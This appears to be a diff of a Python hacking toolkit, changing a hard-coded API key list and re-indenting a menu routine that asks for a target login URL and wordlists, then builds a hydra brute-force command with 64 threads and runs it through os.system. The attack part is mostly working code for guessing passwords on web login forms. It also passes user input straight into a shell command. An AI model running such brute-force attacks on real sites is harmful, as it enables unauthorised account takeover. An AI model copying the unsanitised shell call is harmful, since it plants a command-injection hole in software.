@@ -22,7 +22,7 @@ init(autoreset=True)
 
 
 VALID_API_KEYS = [
-    "x0A1B2C3D4E", "x0F5G6H7I8J", "x0K9L0M1N2O", "x0P3Q4R5S6T", "x0U7V8W9X0Y",
+    "x", "x0F5G6H7I8J", "x0K9L0M1N2O", "x0P3Q4R5S6T", "x0U7V8W9X0Y",
     "x0Z1A2B3C4D", "x0E5F6G7H8I", "x0J9K0L1M2N", "x0O3P4Q5R6S", "x0T7U8V9W0X",
     "x0Y1Z2A3B4C", "x0D5E6F7G8H", "x0I9J0K1L2M", "x0N3O4P5Q6R", "x0S7T8U9V0W",
     "x0X1Y2Z3A4B", "x0C5D6E7F8G", "x0H9I0J1K2L", "x0M3N4O5P6Q", "x0R7S8T9U0V",
@@ -1190,32 +1190,30 @@ def path_discovery():
             
             username_field, password_field = confirm_fields(username_field, password_field)
 
-bf_choice = input(Fore.YELLOW + "Choose Brute Force option:\n1. Both username and password\n2. Password only\n" + Style.RESET_ALL)
-if bf_choice == '1':
-    userlist_name = input(Fore.YELLOW + "Enter username wordlist filename (with extension): \n" + Style.RESET_ALL)
-    passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
-    target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)
+            bf_choice = input(Fore.YELLOW + "Choose Brute Force option:\n1. Both username and password\n2. Password only\n" + Style.RESET_ALL)
+            if bf_choice == '1':
+                userlist_name = input(Fore.YELLOW + "Enter username wordlist filename (with extension): \n" + Style.RESET_ALL)
+                passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
+                target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)
 
-    print_colored("Starting brute force attack...", Fore.GREEN)
-    hydra_command = f'hydra -L {userlist_name} -P {passlist_name} https-post-form "{target_url_no_protocol}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password" -t 64 -w 1 -V'
-    
-    # عرض الكود باللون السماوي قبل تنفيذه
-    print(Fore.CYAN + hydra_command + Style.RESET_ALL)
-    os.system(hydra_command)
+                hydra_command = f'hydra -L {userlist_name} -P {passlist_name} https-post-form "{target_url_no_protocol}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password" -t 64 -w 1 -V'
+                
+                # عرض الكود باللون السماوي قبل تنفيذه
+                print(Fore.CYAN + hydra_command + Style.RESET_ALL)
+                os.system(hydra_command)
 
-elif bf_choice == '2':
-    username = input(Fore.YELLOW + "Enter username: \n" + Style.RESET_ALL)
-    passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
-    target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)
+            elif bf_choice == '2':
+                username = input(Fore.YELLOW + "Enter username: \n" + Style.RESET_ALL)
+                passlist_name = input(Fore.YELLOW + "Enter password wordlist filename (with extension): \n" + Style.RESET_ALL)
+                target_url_no_protocol = input(Fore.YELLOW + "Enter target URL without protocol (e.g., example.com/login): \n" + Style.RESET_ALL)
 
-    print_colored("Starting brute force attack...", Fore.GREEN)
-    hydra_command = f'hydra -l {username} -P {passlist_name} https-post-form "{target_url_no_protocol}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password" -t 64 -w 1 -V'
+                hydra_command = f'hydra -l {username} -P {passlist_name} https-post-form "{target_url_no_protocol}:{username_field}=^USER^&{password_field}=^PASS^:F=Invalid username or password" -t 64 -w 1 -V'
 
-    # عرض الكود باللون السماوي قبل تنفيذه
-    print(Fore.CYAN + hydra_command + Style.RESET_ALL)
-    os.system(hydra_command)
+                # عرض الكود باللون السماوي قبل تنفيذه
+                print(Fore.CYAN + hydra_command + Style.RESET_ALL)
+                os.system(hydra_command)
 
-return_to_menu()
+            return_to_menu()
 
 def nmap_scan():
     print_colored("\nNmap Scan Options", Fore.CYAN)
